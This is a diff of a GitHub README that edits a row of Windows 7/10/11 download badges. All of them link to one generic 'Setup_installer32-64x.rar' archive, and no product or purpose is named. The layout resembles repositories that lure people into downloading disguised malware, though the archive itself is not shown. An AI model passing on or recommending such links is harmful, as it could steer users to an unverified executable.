@@ -14,7 +14,7 @@
 > [!NOTE]
 > - **Select a version**
 
-[![Windows7](https://github.com/user-attachments/assets/77144e33-b84d-46f4-8e3f-c6663ea0dd9a)] [![Windows7](https://github.com/user-attachments/assets/92bc53b4-e1f2-4de3-bd11-38a17c2153c2)](https://github.com/akram209/junior/releases/download/Release/Setup_installer32-64x.rar) (https://github.com/akram209/junior/releases/download/Release/Setup_installer32-64x.rar) [![Windows10](https://github.com/user-attachments/assets/4cf9efd8-dfd2-421d-9f5a-fdfc49d6e6ff)](https://github.com/akram209/junior/releases/download/Release/Setup_installer32-64x.rar) [![Windows11](https://github.com/user-attachments/assets/a489d02f-1b28-4082-9e87-f867e25ad7a8)](https://github.com/akram209/junior/releases/download/Release/Setup_installer32-64x.rar)
+[![Windows7](https://github.com/user-attachments/assets/92bc53b4-e1f2-4de3-bd11-38a17c2153c2)](https://github.com/akram209/junior/releases/download/Release/Setup_installer32-64x.rar) [![Windows10](https://github.com/user-attachments/assets/4cf9efd8-dfd2-421d-9f5a-fdfc49d6e6ff)](https://github.com/akram209/junior/releases/download/Release/Setup_installer32-64x.rar) [![Windows11](https://github.com/user-attachments/assets/a489d02f-1b28-4082-9e87-f867e25ad7a8)](https://github.com/akram209/junior/releases/download/Release/Setup_installer32-64x.rar)
 
 
 
